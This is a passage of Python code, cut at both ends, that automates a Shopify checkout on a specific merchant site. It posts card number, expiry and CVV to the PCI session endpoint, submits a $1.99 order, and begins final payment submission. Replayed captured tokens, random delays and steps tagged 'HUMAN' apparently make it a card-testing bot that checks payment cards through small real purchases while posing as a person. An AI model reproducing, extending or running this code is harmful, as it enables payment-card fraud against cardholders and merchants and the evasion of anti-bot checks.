                if shipping_match:
                    delivery_handle = shipping_match.group(1)

            # Pattern 3: Look in selectedDeliveryStrategy or deliveryStrategyBreakdown
            if not delivery_handle:
                strategy_pattern = r'"selectedDeliveryStrategy":\{"handle":"([a-f0-9\-]+)"'
                strategy_match = re.search(strategy_pattern, response_text)
                if strategy_match:
                    delivery_handle = strategy_match.group(1)

            # Pattern 4: Try to find any valid delivery strategy handle (32hex-32hex pattern)
            if not delivery_handle:
                all_handles = re.findall(r'"handle":"([a-f0-9]{32}-[a-f0-9]{32})"', response_text)
                if all_handles:
                    delivery_handle = all_handles[0]  # Take first valid handle found

            # Fallback to known working handle from laarll.txt capture
            if not delivery_handle or len(delivery_handle) < 20:
                delivery_handle = "371185d855ad81e48cb6ae21263dc422-83699398207614a0a44d4d7d67d4e2c6"

            self.delivery_handle = delivery_handle
            self.logger.data_extracted("Delivery Handle", delivery_handle, "Checkout Page")

            # ========== FIXED: Extract signed handles properly ==========
            signed_handles = []

            # Pattern 1: Look for signedHandle in deliveryExpectations (HTML encoded)
            signed_handle_pattern = r'signedHandle&quot;:&quot;([A-Za-z0-9+/=]+--[A-Za-z0-9+/=]+--[A-Za-z0-9+/=]+)&quot;'
            signed_handle_matches = re.findall(signed_handle_pattern, response_text)
            if signed_handle_matches:
                signed_handles = signed_handle_matches[:5]  # Take first 5

            # Pattern 2: Look for non-HTML encoded version
            if not signed_handles:
                signed_handle_pattern2 = r'"signedHandle":"([A-Za-z0-9+/=]+--[A-Za-z0-9+/=]+--[A-Za-z0-9+/=]+)"'
                signed_handle_matches2 = re.findall(signed_handle_pattern2, response_text)
                if signed_handle_matches2:
                    signed_handles = signed_handle_matches2[:5]

            # Pattern 3: Look for signedHandle in deliveryExpectationLines specifically
            if not signed_handles:
                # Extract the whole deliveryExpectations section and parse
                delivery_exp_match = re.search(r'"deliveryExpectations":\[(.*?)\]', response_text, re.DOTALL)
                if delivery_exp_match:
                    exp_section = delivery_exp_match.group(1)
                    signed_handles = re.findall(r'"signedHandle":"([^"]+)"', exp_section)[:5]

            # Pattern 4: Look for any base64-like signed handles in the page
            if not signed_handles:
                # Look for patterns like "Nyi+ffdqtbckfHzpD9YIPdWbPGXDfQXyT+H4xfGn..." 
                broad_pattern = r'[A-Za-z0-9+/]{100,}={0,2}--[A-Za-z0-9+/]{10,}={0,2}--[A-Za-z0-9+/]{10,}={0,2}'
                broad_matches = re.findall(broad_pattern, response_text)
                if broad_matches:
                    # Filter unique and take first 5
                    seen = set()
                    for match in broad_matches:
                        if match not in seen and len(match) > 150:
                            signed_handles.append(match)
                            seen.add(match)
                        if len(signed_handles) >= 5:
                            break

            # Fallback to known working signed handles from laarll.txt capture
            if not signed_handles or len(signed_handles) < 3:
                signed_handles = [
                    "eL2d2zI4UG/ie3aRjVzWAr+r0luzwtq2n0X9T7H5CzgsWg7caMOqRHa5SsbyFVt/br3FDv+8fQuq5qGaS33O2Klgx61tAzHIgukUujNfROf42R/CtKIcobTNfoHsSaKf7qO1lzZ/cQ9JySnpBkgJs/mqNxVkYRCl1b9Aj9xTAXvSmpIvtsBxbgHsfdYccfAJprYDFbY3tjsUW+eXhthR3KVPfOxfn6xkeoB4kmPJCvaUjhvry9bRdSJ28KfGS03amfqI9xOB12YXneUUbpw65dZ1907yTnIr+Gr9pMrNZHPHxFMdBdqYfCDUm6U1futts3V2/hK/sjvVGq4cJOApA36zmTcQv89fVozlky87pzy2f5yXWFeadsL4XdqVKjAoypg+2JSklbop+Ij4PyBY6Fct9owKkGQw13YsRJx3dQkv7Rz2+vpxxXq7v/L5zdq7+F0GrrrZqzhIVZ5x9wQj9Z1qE4j2GLNM1Z4n7GDeh6eGuz+yTdtfHn9UM9eNSs1rMOYGSWMSY/VbWaOGwZD108lH+2CWKO6mVgDsyX8delfbO5yJy4HCAqmw72X0JrvNKckxq8y3ufPKj9OJZg1otVcdaAzll/ZA1su1a/iqcfSbiktkIUPX88tfSI+UzniCrCrT3T4OBpjFvqonfADdIsH2iwh2a/L29e9PdlsNNzU+PeFi+RrKvFrJAiMqGR2ZRNRq6ewKRTtJF+JNfquhbYujLchW5SGn9qol0S62lYwmB+O02I965xTMLGLZkNDTC3UuYgA+yGuK06OrYOIaSUl1zKmsHJv2xb77AFMvR2ka/sSE0AiuS4oqFvAb1Pv+nASl0yJolSEQDnIFMEg4Rkcsi7sLzxvBUt6NbZ8Z+lcEpngEqrL1yIHWcl3LI1xRxy85DTBOEttzutbieg+YQgv3LX3J521c2BOp7CAPQvtfvA5Ly95LoJkuSYDzb7pn+bp9LU3mjEKGk31j5o/+rbwRs1dfCLqmr9S62KOJPxTexRO+1upFDKi4Pm3okrpEvVKjnIvyklnZt59QhktQCobBOcMe05RbGYUTXNLLe47wrpS+Ops+MW8qY42nyP2MhqaKzU5ksdbhHkKtWAxNUOcbmcwNw62CJbOxBYv+U1Q2sj5s8shUxxMzwii7tebYxtvd5O+QE7yHLbQ8Wlv7OsinHcxWXYwxBa3BNCT6CCQ+mYnbHvKsdnHO5zlcI326TTvLq+HGz+B6M442rBKXEq+4RMRFp4sPbkMfQR1ASPCW9OurPktZF89ULeDn8Y0wvWQlRsfb73Yvuz/TwONZBRO8bEIyyAL88yAnN+mRV0T8wCusni0S13qJxVNOJTAilEPNA5lA1xL8OAVS+eCBxRQHjUeSQlAKDdxqb6kXzRouF8GmD3YpewM1BeYbR6lasZvVQ3JhAQbc5e4eYCkHgPlwa/yd+AxMpSBmKoVksD7/ur7QoG9in+hHvdzutnl/6ND1nxuSmiL8Dab+hjCJyx8Qc82T2NYWbmFKN2pwwPGW3vOoe/YZAACw5KEcVw7gaeaXa0RHhO6zZ9tDjMyT22iVTqMgY6oppUez45Q35beGr25zYaacRseszEbezbSF/Tos7GvlypGeRnP6d7WPuln++WRE3Sn3iqqExfHH3XYvkfUEYZgj50MvZZTmpqB+8b0oaQA=--OaP5G5iXzzR/Avkn--CwsAYuPx/cHJHDq1fRp8ng==",
                    "j3NRyv9w5lA1fZAgXTfjPUbcZySnqY66FWbzre1/ztG+G4RF8r2nm64KFawic8g6CzRqbGm17jBlG2QPnlDWx5DD+RyGCk86r8w86gR3jRcJHbk4YRugXWz2ZnJMAG+icCKex3HMsfHd69+BuASrKmoIJmei6nwVHjJ37wHezAwckPRb6zFHFaHZIuoRF7PRUc+vuTjqIiZW3uH5cNStIRj5UvUD14BlkduNa2wksKpq0bowYWPXxKDwByDq2xH+kf9H1rMKCIx3/0u/AFMWrkLohklvh8Ys28B+Nud89DufWfBtD8MgQIZbHKCPR0dVXecpWdWGcAmECPVdziwTCcmJ1sSk8fOItE+WnWegNOBLSSzv3UkpCOeZIE91TWpqdy+2fGiTS+a93QO04W8Ll/188F9QBJFWj2CWA2AvqVWMWHWMOfkT4u4efAKPdmy6soCqi4qIpJw/T6jzvTcB5tOpKLMdpUrovVqf4Q/fYNt3s+4gMNGB7FLmvYrLjWA81XpAo26AYSWsgFPO7+lDa+3X6xUDM1gj25s3xNaq4Qpc+jpLw56wo5gCrS0IRfICqqwvctOa9qgLdUIbIxV8bry2A2tKo4YjbblzSxcOyPkZcdJ3VuXayqxfgeoZH50gOgJJIcOqgcRc69znt/q/KUyBGQfcVfKXCT9hCoE8r2Ux2kMhEB7C/x1DL6IpF+N7wycqEk+wKG7twjEMKHjruFEDUS9pXEtkHbbTz0bLIFFicMRi9beThixwdB/Jju4BSPv6PpeVNJ5SwY2LOUD/m0Bm23F7oSmp7HiLSMaoM5rVFeNg4Wd9sTGZRCPZD1Va/g9G0cPmRxU3vTVCpYjjGQqxzLsOqo0v5yOyaPX/T4W+Ard633QD9NnuOOMOkHGN2BWpZQLovrOj0ehfmJCUy5+bUv29ot/Zr57AWyLQv2f/N5w14stYNWmS3li9UcMGw3F/kOt+SKijqJMe4IaMAE3F8QVzWj6Sr/+m8tJBLw2OwKjP6eMfE3jtIh1vTHwimGgPJRwPWAR5fQV6JJT0RJQFqzEH2IRnF4O2oaOWjeoC+j8FxGjrWWfxdo9bjs4JYwAoVD+/4nR6AZizzlHEG1newGS9dYhmA4pl7+M5MQkDycTlxvF4u7Xk1dJSkuZTqgaXwO/XNpDr1G9qaIy5m/dAqeQenAzvcPaDytr4wdYmySVHJ5vqc0X4Heh0yp9q60kC4HIHSQDPPWweWkcblMR+49NUKZ7NjUWHb7YlEajSS+DsgRYSLfNcZVzg9y2X8WUhvsyTDYLvf1TG94FeTO8/vPiCLzK9lDuzztayWO35ZeVJx8KhBNj5g+GwIL/U3Tvd6UQmnoi4aUT1mf0hJSPCkUCiyWINMHd4vfB21ByiehFOOMkdYLUR/cdVwiNcCDPrQ91HuvvrwpQWXQ8/79umM92UFchWtTIZeSM8sxucn2H3bZnwnKuI2UAb/v4WYyEWiqMlFOCRFVI1uZh4Ou2lxfE=--ajO4fbtyUDN+vVZ5--S8kaRD35eyQPjlPmfYKAXQ==",
                    "YFswXPs5uRT4eiaWpWT2qokhKcQK4z5IlMPUDCOKKA/1fmxqm5ugTdWyXgCXsasKGuRsCz2WhWKgwvWZXni5IZeFnX2sIEeP0ac43EnaH1BLhSGcp1UhBe/lJCiBYqusNFy1wUH38JfPYV6oswcSFUEe4BbmrbPZOcGY0nLsUfjC4pTAg1BYrXaJyHoSO8JyZemo0KzeBryQ5OA5gUZ5aC/PuiB8CGmC0QnaoIWR2vEAyKg58sqcaZBNP8HslXRGSN/18cHsnWh4U1Fa2THmOqpBFvgARPK8MclBttHs7gxfB+0Ij86Is2wCx5k7hpn5QiUcN4HIm0PGVUe/fOkNWxrmdOctkwbBVdHWQnZps6G3J/uOhzYKGil/c4SrKIwIS7GnCvC8yqSbmU9ukabkysZDgy2ru2vWo6ieg/CozT7ZI2BVTqrLhKv6xCs/HTz36xuLx+X9AuTYVbbi65mbkAbgW4Ncfh9L2d3wmq76Kt/p8H13n8GX9/9eg7HKPLthKTOOMR0lCnhFgd3y3/2QCuF3gkAJd7Dfn2LO9fwi7xHaDTixNjmm5SiA7QjM95Ojz0iV8V/lR0GXG4102OKb9qQd2hFrGwIiLmKbrlpP/Ka2RmWf8OqSfpcyGvecM3kJxAWBlW53XKf4IiMSmUNtUvo3hc5daLm/6Ya6/EgoDutyDT5wZVhRoTQuxlwNyqldpSz6GkAqUj1iz5qkNmh/sbkkUKWWBUtjwn+UDzEtuNvvDruNzTBNlhv5CENUnh1KrXF+WwOI8koUdEY2DDEGX/8eYf16ufT6LgomiiTs1CASkuij33vL674eoHGWa9YQkYQCMZoyQ8IEqPkho/NFCTrOqpVlYRakZkeuJGuqEMNOMw4OUMJpgMF7aYnyjS38fzrW+dwlR8knFyxBKDg1W9tCBqiARl+Cjng8WYZPuzIessrmTGD8ZRGqM7DTEQVL3/GX7NTY5s0RUBDEXtyG+rfSqDxpMkPr+G9iolPQb3rOtZCKYySmdVrQ8XSNYUDsZJ5UXE/dZ4U+fTv8hu8WSsV4oIR6MHDm/n/Vhw9yZAyhnnw=--GqTnD/U8L3v+eVge--g1AMK75oiKvfvLG+OMAC9A==",
                    "j7UtGoeRPwxP9Bj2lm32Y2515WUe+O1K/8bKRbIH55JhlK6xFHfFqmUER4iKFSDENXeEGNIx3zELMO6mOuts/QUmtOrGKBePgICZGVtXvI6regWgwadK6LST4pfxFivrtnA0OJeKrN8UP3L1HjCfOd/IzwDGE4We7g7aBhuZs7DsP2YkVK7MTM65EkeU9N6qBN9Ha2GxVztSMe+677Org3B6/lRsRPzHG5v11HcpFPY8/7DR157ajDTKF+JbsvB1qHomR5pCZPp109QN6//b6uMUbWs7kxfk4rbvyvzaB1O9C7inXGSSkjgmYNNWyoF8CFQKEHf8VNu+hlPXJg6Vpk3VNu112c5LP1KvfqlmFMK0lzg39p0N/kRJ0uEx9cUsyLqlkfWcuWYVPxaTkm2OvWnzOWyt8wJNoSt7+E3dLi+RQvgxJHiwXULHrfZfHeT8/g39w0BlNhIjzCGQJ1z48X/vy94GkdcsSHfhQcEgebcC/K8caJXzxIzpyf7UJUWyiWI+yGgytbKUz+uoEfP8v+raHh0SPv5Ah1UfX2dgZNBIICl97OFqBs7bVE1rZzh0ZjNZPirAc7wUeVSJO/CwLxb8TdSyX/gCnPXs81H8a1cWpHdeIrZwgdaqNIeGTyGGATP8WE/qxXXD2XirIA1BnjlGq8MxFXOX2p6Hn0IcMurqiJ+ZN9BEi9Hw+sVvfg8O35BuyPbAjj12BVAq1TJI6+cLntYYdRR+YHSuiZ1g7FHrfUhkm7hfObG4OEH3OzWVY3PSlxR5Hjss+lf/TRTE0ubZfQ6AR1+83RBdatDCwXazT/Jq6EjV9A7ROe8yXQZdNDNCFupyl7u5H/8aXgj1/7tlwmmcNHuy3puGa1+iEej3HSBb47fwR9fSzaPWag64nZqXiVrSbqKlfdBBEGZf3ix362sIlF4j6j5Yf4croRBUxeLnQPIX3LOHQUxxSGwwA+2EyLU69XtilfWUZTmdllVplU7Y1VWeEuO03hRd8FaKZyOvdCcjNqiRTtDhv/OJOI8VMIXqndLtpPRwObZL/L23H8ClnktUd+qIDjZtw01T9RFKom3HI73MrnnOOpnIxRUTfrOGjzIG9PxCur9tZsoJdsoIZeU5ev4AaJU1sgL0uzFiTIrvJS8wh9L1beYolGMKYrlPSp9sToNsIt6CV4jMz9tk+eY778kVWwP/O1IdJXt5/nkXAk50hQVY+gi0Tqg/B9KT+IwIYYwG0aRPqfynyw7NXFMPkFo4BF7YHWBj7U71QlxPSNjeCSgitZySOM22HHA0q1xw9aeRKWxZdBUIujxOOCRWfK0ps/K4tAWgbNdJRisXYvYIOYI0HhvfSgm3P9BdlbN7sjIOBGVqGC/3BUEmiObCFPAOTJihQqBamMV+pvuNNlCNSNR4noYKmVGr3zNH0je3W0rKCclrpBWgjpSfNPh2LaXarsjJNheQ4h+RcRQY1+H7r+kVOB4qDQpu3mufQIARWyjME5FVn6fBWlQ=--EHzJrM+68bznKi0X--1PHE5kYlcNzbr2U5PBXUfQ==",
                    "H8+4C3IwNIu3/CyxhfIWREoM0ONfS92PHBDsjI+U4dVnDT2NFvEkXjqcNv0t4VhmYhxsXQYufKjZ5GvcStqIYNfbKGnh/m9NXBJQowSB+21kKYCgGN610po357QgajHxXWI1tTQq3Y+7rclN4OctsPw6ybx6MU0T7pvVouaWkTYb6B63qujX06gvgO2TnqrLAtv99MdwUpBkjw96fsRnkHBQ+bpW3Lj42CfDBNFfypKsLQXb+ix0R8UXS26W2UnbRyrbrpKbceoanHvItpW9YT3+TmnkgaY1q0e+tpHtldusYsSjJ2XCKXxwU6KmRrvxWVhRMcHR1IhKQEP66mByNFjV9NA5ubdqIIKEQ06J09l3rGymXKY1ETSue54IAQGHn2G7BAvXeQ5yp9bN9F5+M27bgv6ZNNwyG2HWtgoriTgIxptW2XSGbArjS4k9217iB8grtG9I8+1qzaeokepoW4vvgwwclxy0KHYuV1VOeeiNkI1GGrE240h5KMW3sjQ2Uj8OTV+khXOG/sSh2p4iHIcraaqnr9CcCjMBbFMX6l2gKEZ9JWufLF19yBlZDpsLtDC3xzWIml3Q0IN9V3AgBGJ7hp6usW5mqjo/i5VC3WjQW1cN/CeBNabYlW1ljDozWJ+9lBVKB1M5WgYsjZuS6dPHR4YcVmNoQxmRl1Lkpi0vvJZm5+HNAPLX+/oTK4yWuv4LFEGEWnZwFgcpcxmoECwJHx4+sjTOgSvNkaAWEbnbTHwB77/O+ngkmjeiAMg2xJsyiqs644506SVWGg2HaTH9Bcml+7cp+IZZ2L7prwgg0/45wQuo0KTCXYlwJOEBvuflN095AlUlYsWnHvdkk43cqxUF0ZUdn/Bhs0wI2ZDYJG8bBFb5qyhZY/UQ7btvjLWNT2ptiF3jQgqYt79LkBkjLGy8+UZBUitO8grCKYfTYY7ZNVO4JtbBk+I6cOLBxY6hxK48VQmB7RcDFeu3j1R9x3yHNYyvKQgxrb4wLSQeMlJv7StfII4ZZNAPI349SKbH6gMpCRP5bF7S1GyBwddSuoUK/Ae5x3G2eZEueWz1LAtzTAFweqzOdQZyTJENoW9LYhUhn3c/z3tkQABFBMyovpYCZFo0KxfxNJ7yTh52/ZGVPEyAPExcDtsYI0bPXZTDo+krhn8IllkwhGfjftdniwK0zry5oLiq9IEHhVZNibC5dAoXqDVF/i2oJ0ncZ103IxdRYxdAdck3z6O14Rb9a0QsnYeTiKYe8z3VBaQxQLrBBIgN/wibxI2nrmrxZTiZKyp96/hHUVBMpLNPBjD4ZngS7uA8p6JvJBTF32dpEA8SRXfm2WudofRROm1AdOBMUaKiSKxZayH85vEdz4pWbRg/tDKKGysCEFY2c6ituHw3gZ2aVU+z2JVc/ktpgMH7SCFQeE2NsKTppMMh5qRE6hTxDz1miTOjfkJbO4OIyPNeRrHN66W3kJSA6dLhxE4bKKbtS6SjJGsaxS1PHllZDZo=--GPDD7khSRjcm/aM9--jRSzaQ1Wq67sSLcmNIoYIg=="
                ]

            self.signed_handles = signed_handles
            self.logger.data_extracted("Signed Handles Count", len(signed_handles), "Checkout Page")

            await asyncio.sleep(random.uniform(1, 2))

            # Step 7: Create PCI session for card
            self.logger.step(8, "PCI SESSION", "Creating PCI session for card", "checkout.pci.shopifyinc.com", "HUMAN")

            # Get shopify-identification-signature from checkout page if available
            shopify_sig = self.find_between(response_text, 'shopify-identification-signature" content="', '"')
            if not shopify_sig:
                shopify_sig = 'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiI1NjY5OTY1MDI0NCIsInVuaXF1ZV9pZCI6IjM3MTE4NWQ4NTVhZDgxZTQ4Y2I2YWUyMTI2M2RjNDIyIiwiaWF0IjoxNzcyMTIzNzM5fQ.upDKjknj6QnU6fYCpSUh6RfYbV592VumTYmokfdu0-o'

            pci_headers = {
                'accept': 'application/json',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/build/146205538bebcd8f4e98f92af4c5e3405d99d360/number-ltr.html?identifier=&locationURL=',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
                'shopify-identification-signature': shopify_sig,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            }

            card_number_clean = cc.replace(" ", "").replace("-", "")
            month_int = int(mes)
            year_int = int(ano) if len(ano) == 4 else int("20" + ano)

            pci_data = {
                'credit_card': {
                    'number': card_number_clean,
                    'month': month_int,
                    'year': year_int,
                    'verification_value': cvv,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': self.full_name,
                },
                'payment_session_scope': 'faithandjoycraftsupply.com',
            }

            response = self.session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pci_headers, json=pci_data)

            if response.status_code != 200:
                return False, f"PCI_SESSION_FAILED - Status: {response.status_code}"

            try:
                pci_response = response.json()
                session_id = pci_response.get("id", "")
            except:
                return False, "PCI_SESSION_PARSE_ERROR"

            if not session_id:
                return False, "PCI_SESSION_ID_NOT_FOUND"

            self.logger.data_extracted("PCI Session ID", session_id, "PCI Response")

            await asyncio.sleep(random.uniform(1, 2))

            # Step 8: Submit Proposal (delivery info)
            self.logger.step(9, "SUBMIT PROPOSAL", "Submitting delivery and contact information", f"Phone: {self.phone_e164}", "HUMAN")

            # Build delivery expectation lines dynamically
            delivery_expectation_lines = []
            for signed_handle in self.signed_handles:
                delivery_expectation_lines.append({
                    "signedHandle": signed_handle
                })

            # If no signed handles found, use minimal structure
            if not delivery_expectation_lines:
                delivery_expectation_lines = [{"signedHandle": ""}]

            proposal_headers = {
                'accept': 'application/json',
                'accept-language': 'en-IN',
                'content-type': 'application/json',
                'origin': self.base_url,
                'referer': self.checkout_url,
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'x-checkout-one-session-token': session_token,
                'x-checkout-web-build-id': '146205538bebcd8f4e98f92af4c5e3405d99d360',
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': checkout_token,
            }

            # FIXED: Removed accuracy field from coordinates - it's not allowed in input
            proposal_variables = {
                "sessionInput": {
                    "sessionToken": session_token
                },
                "queueToken": queue_token if queue_token else "",
                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True
                },
                "delivery": {
                    "deliveryLines": [
                        {
                            "destination": {
                                "streetAddress": {
                                    "address1": self.address["address1"],
                                    "address2": self.address["address2"],
                                    "city": self.address["city"],
                                    "countryCode": self.address["country_code"],
                                    "postalCode": self.address["zip"],
                                    "firstName": self.first_name,
                                    "lastName": self.last_name,
                                    "zoneCode": self.address["state_code"],
                                    "phone": self.phone_e164,
                                    "oneTimeUse": False,
                                    "coordinates": {
                                        "latitude": 40.1807369,
                                        "longitude": -75.1448143
                                        # REMOVED: accuracy field - not allowed in input
                                    }
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": delivery_handle,
                                    "customDeliveryRate": False
                                },
                                "options": {
                                    "phone": self.phone_e164
                                }
                            },
                            "targetMerchandiseLines": {
                                "lines": [
                                    {
                                        "stableId": stable_id
                                    }
                                ]
                            },
                            "deliveryMethodTypes": ["SHIPPING", "LOCAL"],
                            "expectedTotalPrice": {
                                "value": {
                                    "amount": "0.00",
                                    "currencyCode": "USD"
                                }
                            },
                            "destinationChanged": False
                        }
                    ],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": delivery_expectation_lines
                },
                "merchandise": {
                    "merchandiseLines": [
                        {
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {
                                "items": {
                                    "value": 1
                                }
                            },
                            "expectedTotalPrice": {
                                "value": {
                                    "amount": "1.99",
                                    "currencyCode": "USD"
                                }
                            },
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }
                    ]
                },
                "memberships": {
                    "memberships": []
                },
                "payment": {
                    "totalAmount": {
                        "any": True
                    },
                    "paymentLines": [],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": self.address["address1"],
                            "address2": self.address["address2"],
                            "city": self.address["city"],
                            "countryCode": self.address["country_code"],
                            "postalCode": self.address["zip"],
                            "firstName": self.first_name,
                            "lastName": self.last_name,
                            "zoneCode": self.address["state_code"],
                            "phone": self.phone_e164
                        }
                    }
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": "US"
                    },
                    "phone": self.phone_e164,
                    "phoneCountryCode": "US",
                    "marketingConsent": [],
                    "shopPayOptInPhone": {
                        "number": self.phone_plain,
                        "countryCode": "US"
                    },
                    "rememberMe": False
                },
                "tip": {
                    "tipLines": []
                },
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {
                        "value": {
                            "amount": "0",
                            "currencyCode": "USD"
                        }
                    },
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "note": {
                    "message": None,
                    "customAttributes": []
                },
                "localizationExtension": {
                    "fields": []
                },
                "shopPayArtifact": {
                    "optIn": {
                        "vaultEmail": "",
                        "vaultPhone": self.phone_e164,
                        "optInSource": "REMEMBER_ME"
                    }
                },
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": []
                },
                "optionalDuties": {
                    "buyerRefusesDuties": False
                },
                "cartMetafields": []
            }

            proposal_payload = {
                "variables": proposal_variables,
                "operationName": "Proposal",
                "id": "b57490dc1546a56320e06227e53d5181c7e8890c75160afeda49539558cd7886"
            }

            response = self.session.post(
                f'{self.base_url}/checkouts/internal/graphql/persisted?operationName=Proposal',
                headers=proposal_headers,
                json=proposal_payload
            )

            if response.status_code != 200:
                return False, f"PROPOSAL_FAILED - Status: {response.status_code}"

            try:
                proposal_response = response.json()
            except:
                return False, "PROPOSAL_PARSE_ERROR"

            # CRITICAL: Check for errors in proposal response
            if 'errors' in proposal_response and proposal_response['errors']:
                error_list = proposal_response['errors']
                error_msgs = []
                for error in error_list:
                    code = error.get('code', 'UNKNOWN')
                    msg = error.get('localizedMessage', error.get('message', 'Unknown error'))
                    error_msgs.append(f"{code}: {msg}")

                error_str = " | ".join(error_msgs)
                self.logger.error_log("PROPOSAL_ERROR", error_str, "Proposal")
                return False, f"PROPOSAL_ERROR - {error_str[:150]}"

            # Check for unprocessable terms violations
            negotiate_data = proposal_response.get('data', {}).get('session', {}).get('negotiate', {})
            if 'errors' in negotiate_data and negotiate_data['errors']:
                error_list = negotiate_data['errors']
                error_msgs = []
                for error in error_list:
                    code = error.get('code', 'UNKNOWN')
                    msg = error.get('localizedMessage', error.get('nonLocalizedMessage', 'Unknown error'))
                    target = error.get('target', '')
                    error_msgs.append(f"{code}: {msg} (Target: {target})")

                error_str = " | ".join(error_msgs)
                self.logger.error_log("NEGOTIATE_ERROR", error_str, "Proposal")
                return False, f"NEGOTIATE_ERROR - {error_str[:150]}"

            # ========== CRITICAL FIX: Extract and store complete seller proposal data ==========
            try:
                result_data = negotiate_data.get('result', {})
                seller_proposal = result_data.get('sellerProposal', {})
                buyer_proposal_data = result_data.get('buyerProposal', {})

                # Store complete delivery data from seller proposal - THIS IS THE KEY FIX
                self.proposal_delivery_data = seller_proposal.get('delivery', {})
                self.proposal_buyer_identity = seller_proposal.get('buyerIdentity', {})

                # Extract total amounts from seller proposal for exact payment matching
                seller_merchandise = seller_proposal.get('merchandise', {})
                seller_payment = seller_proposal.get('payment', {})
                
                # Get the exact total amount from seller proposal
                total_data = seller_proposal.get('total', {})
                if total_data and 'value' in total_data:
                    amount_data = total_data.get('value', {})
                    if 'amount' in amount_data:
                        self.total_amount = amount_data['amount']
                        self.logger.data_extracted("Total Amount from Proposal", self.total_amount, "Seller Proposal")

                # Get subtotal
                subtotal_data = seller_proposal.get('subtotalBeforeTaxesAndShipping', {})
                if subtotal_data and 'value' in subtotal_data:
                    subtotal_val = subtotal_data.get('value', {}).get('amount', '1.99')
                    self.logger.data_extracted("Subtotal", subtotal_val, "Seller Proposal")

                # Get shipping amount from delivery lines
                if self.proposal_delivery_data and 'deliveryLines' in self.proposal_delivery_data:
                    delivery_lines = self.proposal_delivery_data['deliveryLines']
                    if delivery_lines and len(delivery_lines) > 0:
                        first_line = delivery_lines[0]
                        selected_strategy = first_line.get('selectedDeliveryStrategy', {})
                        # Try to get amount from delivery strategy
                        if 'amount' in selected_strategy:
                            amount_val = selected_strategy['amount']
                            if 'value' in amount_val:
                                self.shipping_amount = amount_val['value'].get('amount', '0.00')
                                self.logger.data_extracted("Shipping Amount", self.shipping_amount, "Delivery Strategy")

                # Extract new queue token
                new_queue_token = result_data.get('queueToken')
                if new_queue_token:
                    self.queue_token = new_queue_token
                    self.logger.data_extracted("Updated Queue Token", new_queue_token[:30] + "...", "Proposal Response")

                # Extract new session token if available
                new_session_token = buyer_proposal_data.get('sessionToken')
                if new_session_token:
                    self.session_token = new_session_token
                    self.logger.data_extracted("Updated Session Token", new_session_token[:50] + "...", "Proposal Response")

                # Extract complete delivery lines with all required fields
                delivery_lines_complete = self.proposal_delivery_data.get('deliveryLines', [])
                if delivery_lines_complete:
                    self.logger.data_extracted("Complete Delivery Lines", len(delivery_lines_complete), "Proposal Response")
                    
                    # Store the complete selected delivery strategy for reuse
                    if len(delivery_lines_complete) > 0:
                        complete_strategy = delivery_lines_complete[0].get('selectedDeliveryStrategy', {})
                        if complete_strategy:
                            self.logger.data_extracted("Complete Delivery Strategy", "Extracted", "Proposal Response")

            except Exception as e:
                self.logger.data_extracted("Proposal Data Extraction Warning", str(e), "Proposal Response")

            self.logger.success_log("Proposal submitted successfully")

            await asyncio.sleep(random.uniform(2, 3))

            # Step 9: Submit for Completion (final payment)
            self.logger.step(10, "SUBMIT PAYMENT", "Submitting final payment", "GraphQL SubmitForCompletion", "HUMAN")

            # ========== CRITICAL FIX: Build payment lines with EXACT amount from proposal ==========
            # Use the total amount from seller proposal, not hardcoded value
            payment_amount = self.total_amount if hasattr(self, 'total_amount') else "1.99"
            
            payment_lines = [
                {
                    "paymentMethod": {
                        "directPaymentMethod": {
                            "paymentMethodIdentifier": payment_method_identifier,
                            "sessionId": session_id,
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": self.address["address1"],
                                    "address2": self.address["address2"],
                                    "city": self.address["city"],
                                    "countryCode": self.address["country_code"],
